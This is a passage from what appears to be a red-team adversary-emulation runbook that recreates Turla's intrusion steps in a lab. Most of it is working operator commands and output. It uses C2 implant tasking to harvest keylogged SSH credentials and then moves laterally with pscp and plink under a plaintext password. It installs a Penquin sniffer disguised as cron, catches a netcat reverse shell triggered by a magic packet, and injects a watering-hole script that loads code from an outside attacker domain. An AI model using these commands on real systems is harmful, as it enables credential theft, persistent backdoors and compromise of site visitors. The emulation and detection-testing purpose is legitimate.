  * :heavy_exclamation_mark: **Type in full, do not copy or autocomplete,** <http://kagarov/index.html> into the address bar and press enter.

* Open a PowerShell terminal and **type do not copy** the SSH command:

ssh adalwolfa@10.20.10.23

* **Type do not copy** the SSH password `Password2!` when prompted.

* Within the SSH session, **type do not copy** the follow commands as
`Adalwolfa`:
1. `sudo nano /var/www/html/index.html`
1. Go to line 198 with `CTRL + SHIFT + -` then type 198
1. Replace `Apache2 Ubuntu Default Page` with `Adalwolfa's Page`
1. save the file with `CTRL + X`, `Y`, `enter`
1. Type `exit` to exit from the SSH session

:arrow_right: Return to the Kali C2 server and task the CARBON-DLL implant 
on Adalwolfa's workstation to kill the keylogger process.
```bash
./evalsC2client.py --set-task c6f2aa03 '{"id": 1, "cmd": "taskkill /IM wingtsvcupdt.exe /F"}'
```

* Wait 1 minute and then task the CARBON-DLL implant to exfiltrate the data written
to the keylogger file:
```bash
./evalsC2client.py --set-task c6f2aa03 '{"id": 2, "cmd": "type %temp%\\~DFA512.tmp"}'
```

:heavy_exclamation_mark: Verify that the keystrokes were logged containing the website information and Adalwolfa's SSH credentials.

* Wait 1 minute and then task the CARBON-DLL implant to remove the keylogger and keylogger output file:
```bash
./evalsC2client.py --set-task c6f2aa03 '{"id": 3, "cmd": "del /Q C:\\Windows\\Temp\\wingtsvcupdt.exe %temp%\\~DFA512.tmp"}'
```

### :moyai: Source Code

* [CARBON-DLL Orchestrator](../../Resources/Carbon/Orchestrator/README.md)
  * [Task Execution](../../Resources/Carbon/Orchestrator/src/tasking.cpp#L388)
* [CARBON-DLL Comms Lib](../../Resources/Carbon/CommLib/README.md)
  * [Beacon and task/payload retrieval over HTTP](../../Resources/Carbon/CommLib/src/CommLib.cpp#L313)
  * [Upload task output over HTTP](../../Resources/Carbon/CommLib/src/CommLib.cpp#L342)
* [Keylogger](../../Resources/Keylogger/README.md)
  * [Current hostname discovery](../../Resources/Keylogger/Keylogger/Keylogger/keylogger.cpp#L41)
  * [Token manipulation and session discovery to restart in active session](../../Resources/Keylogger/Keylogger/Keylogger/keylogger.cpp#L579)
  * [Keylogging hook routine](../../Resources/Keylogger/Keylogger/Keylogger/keylogger.cpp#L349)
  * [Set keylogging hook](../../Resources/Keylogger/Keylogger/Keylogger/keylogger.cpp#L719)
  * [Active window discovery](../../Resources/Keylogger/Keylogger/Keylogger/keylogger.cpp#L419)

### :microscope: Cited Intelligence

* <https://securelist.com/the-epic-turla-operation/65545/>
* <https://www.ncsc.admin.ch/ncsc/en/home/dokumentation/berichte/fachberichte/technical-report_apt_case_ruag.html>
* <https://blog.talosintelligence.com/2021/09/tinyturla.html>
* <https://www.welivesecurity.com/2017/03/30/carbon-paper-peering-turlas-second-stage-backdoor/>

<br>

## Step 9 - Lateral Movement to Linux Server

:microphone: `Voice Track:`

Step 9 emulates Turla laterally moving to the Linux Apache server and
installing Penquin.

First, the third CARBON-DLL implant downloads Penquin and `pscp.exe` to
Adalwolfa's workstation, where `pscp.exe` is used with the credentials keylogged
in the previous step to copy Penquin over to the Apache server. Next,
CARBON-DLL downloads changes to the cron service to Adalwolfa's workstation and uses
pscp.exe to also copy the changes to the Apache server.

Lastly, CARBON-DLL downloads `plink.exe` and, using the credentials keylogged in
the previous step, executes Penquin on the Apache server.

Penquin performs the following actions:
* Unpacking a binary (the compiled sniffer) named `cron` and adding executable permissions
* Copying `cron` into `/usr/bin/` as `cron`
* Stopping the cron service
* Creating a cron service file in the `/etc/systemd/system/` folder for `systemd` to execute our cron. Note: The system executes our fake cron before the systems real cron because files located in `/etc/systemd/system/` are executed before files in the `/usr/sbin/cron` 
* Reloading and starting the cron service
* Our cron service installs the sniffer and executes real cron as a child process

In summary, Penquin installs a BPF filter and listens on the Apache server's network interface for a specific activation packet.

---

### :biohazard: Procedures

* From your Kali C2 server terminal, task the CARBON-DLL implant on Adawolfa's workstation
to download Penquin (named `tmp504e.tmp`).

```bash
./evalsC2client.py --set-task c6f2aa03 '{"id": 4, "payload": "hsperfdata.zip", "payload_dest": "C:\\Windows\\Temp\\tmp504e.tmp", "cmd": "dir C:\\Windows\\Temp\\tmp504e.tmp"}'
```

* Wait 1 minute and then task the implant to download `pscp.exe`

```bash
./evalsC2client.py --set-task c6f2aa03 '{"id": 5, "payload": "pscp.exe", "payload_dest": "C:\\Windows\\Temp\\pscp.exe", "cmd": "move C:\\Windows\\Temp\\pscp.exe C:\\Windows\\System32\\pscp.exe && dir C:\\Windows\\System32\\pscp.exe"}'
```

* Wait 1 minute and then task the implant to copy Penquin to the Apache web server using Adalwolfa's credentials.

```bash
./evalsC2client.py --set-task c6f2aa03 '{"id": 6, "cmd": "echo y | C:\\Windows\\System32\\pscp.exe -pw Password2! C:\\Windows\\Temp\\tmp504e.tmp adalwolfa@10.20.10.23:/tmp/tmp514f524f"}'
```

* Wait 1 minute and then task the implant to download `plink.exe`

```bash
./evalsC2client.py --set-task c6f2aa03 '{"id": 7, "payload": "plink.exe", "payload_dest": "C:\\Windows\\Temp\\plink.exe", "cmd": "move C:\\Windows\\Temp\\plink.exe C:\\Windows\\System32\\plink.exe && dir C:\\Windows\\System32\\plink.exe"}'
```

* Wait 1 minute and then task the implant to execute Penquin (Penquin takes ~8 seconds to execute). 
```bash
./evalsC2client.py --set-task c6f2aa03 '{"id": 8, "cmd": "(echo unzip /tmp/tmp514f524f -d /tmp & echo sudo mv /tmp/hsperfdata /root/hsperfdata & echo sudo /root/hsperfdata & echo exit) | C:\\Windows\\System32\\plink.exe -ssh -l adalwolfa -pw Password2! 10.20.10.23"}'
```

* Ensure no commands returned errors in the plink output:
  * > ```
    > unzip /tmp/tmp514f524f -d /tmp 
    > 
    > sudo mv /tmp/hsperfdata /root/hsperfdata 
    > 
    > sudo /root/hsperfdata 
    > 
    > exit 
    > 
    > adalwolfa@skt.local@kagarov:~$ unzip /tmp/tmp514f524f -d /tmp 
    > Archive:  /tmp/tmp514f524f
    >   inflating: /tmp/hsperfdata         
    > adalwolfa@skt.local@kagarov:~$ 
    > adalwolfa@skt.local@kagarov:~$ sudo mv /tmp/hsperfdata /root/hsperfdata 
    > adalwolfa@skt.local@kagarov:~$ 
    > adalwolfa@skt.local@kagarov:~$ sudo /root/hsperfdata 
    > adalwolfa@skt.local@kagarov:~$ 
    > adalwolfa@skt.local@kagarov:~$ exit 
    > logout
    > ```

* Wait 1 minute and then task the implant to clean up downloaded files
```bash
./evalsC2client.py --set-task c6f2aa03 '{"id": 9, "cmd": "del /Q C:\\Windows\\Temp\\tmp504e.tmp C:\\Windows\\System32\\pscp.exe C:\\Windows\\System32\\plink.exe"}'
```


### :moyai: Source Code

* [CARBON-DLL Orchestrator](../../Resources/Carbon/Orchestrator/README.md)
  * [Task Execution](../../Resources/Carbon/Orchestrator/src/tasking.cpp#L388)
* [CARBON-DLL Comms Lib](../../Resources/Carbon/CommLib/README.md)
  * [Beacon and task/payload retrieval over HTTP](../../Resources/Carbon/CommLib/src/CommLib.cpp#L313)
  * [Upload task output over HTTP](../../Resources/Carbon/CommLib/src/CommLib.cpp#L342)
* [Penquin](../../Resources/Penquin/) ([Network Sniffer](../../Resources/Penquin/sniff.c), [Penquin Installer](../../Resources/Penquin/main.c), & [Obfuscation Algorithm](../../Resources/Penquin/crypt.h#L60))
  * [Writes the sniffer (Penquin) to disk](../../Resources/Penquin/main.c#L220)
  * [Moves Penquin to /usr/bin](../../Resources/Penquin/main.c#L121)
  * [Creates a service file](../../Resources/Penquin/main.c#L173)
  * [Stops cron service](../../Resources/Penquin/main.c#L143)
  * [Executes Penquin as cron](../../Resources/Penquin/main.c#L198)
  * [Real cron starts as child process](../../Resources/Penquin/sniff.c#L198)
  * [Installs packet sniffer on eth0](../../Resources/Penquin/sniff.c#L482)
  * [Magic packet filter criteria](../../Resources/Penquin/sniff.c#L437-L442)
  * [Execute reverse shell](../../Resources/Penquin/sniff.c#L405)

### :microscope: Cited Intelligence

* <https://www.leonardo.com/documents/20142/10868623/Malware+Technical+Insight+_Turla+%E2%80%9CPenquin_x64%E2%80%9D.pdf>
* <https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/03/07180251/Penquins_Moonlit_Maze_PDF_eng.pdf>
* <https://securelist.com/the-penquin-turla-2/67962/>
* <https://www.youtube.com/watch?v=JXsjRUxx47E&t=647s>
* <https://lab52.io/blog/looking-for-penquins-in-the-wild/>

<br>

## Step 10 - Installation of Watering Hole

:microphone: `Voice Track:`

Step 10 emulates Turla sending a magic packet to the Apache server, on which
the sniffer component of Penquin reads the magic packet, parses the packet
for the IP address to connect to, and triggers the establishment of a reverse
shell.

First, a few discovery commands are sent through the established reverse shell.
Aditional HTML is then appended to the webpage previously edited by Adalwolfa,
containing script tags that load another simple JavaScript file hosted by the
adversary's malicious site, anto-int[.]com, that redirects users who browse to `http://kagarov/index.html` to
the adversary's malicious site instead, thus completing the installation of the
watering hole.

---

### :biohazard: Procedures

* :arrow_right: From your Kali C2 server terminal, open a new terminal tab using Ctrl+Shift+T. Recommended: rename the new tab to `Penquin NC`

* In the new tab, set up a Netcat listener for Penquin's reverse shell to connect to:

```bash
nc -lvvp 8081
```

* Right click and split the window horizontally. Run the following commands to send the magic packet to the Apache server using
the `sendPacket.py` utility.

```bash
cd /opt/day1/turla
sudo -E python3 Resources/Penquin/sendPacket.py --handler_ip 176.59.15.33 --handler_port 8081 --target_ip 10.20.10.23 --target_port 8080 --payload_type base64
```

* Wait a few seconds and then check the Netcat tab (`Penquin NC`). The Netcat prompt should report a successful connection.

* In the terminal where the reverse shell has connected to the Netcat listener, paste the following command to add the
 watering hole redirection to index.html:

```bash
echo "<script>if (document.getElementById('xyz')) {{}} else {{ var gam = document.createElement('script'); gam.type = 'text/javascript'; gam.async = true; gam.src = ('http://anto-int.com/counter.js'); var sm = document.getElementsByTagName('script')[0]; sm.parentNode.insertBefore(gam, sm); var fl = document.createElement('span'); fl.id = 'xyz'; var d =  document.getElementsByTagName('div')[0]; d.parentNode.insertBefore(fl, d);}}</script>" >> /var/www/html/index.html
```

* Note - this command does not return output. Wait 1 minute and then send the following command to close the reverse shell

```bash
exit
```

### :moyai: Source Code

* [Penquin](../../Resources/Penquin)
  * [sendPacket.py](../../Resources/Penquin/sendPacket.py)

### :microscope: Cited Intelligence

* <https://www.welivesecurity.com/2020/03/12/tracking-turla-new-backdoor-armenian-watering-holes/>
* <https://www.welivesecurity.com/wp-content/uploads/2018/01/ESET_Turla_Mosquito.pdf>
* <https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/03/08080105/KL_Epic_Turla_Technical_Appendix_20140806.pdf>
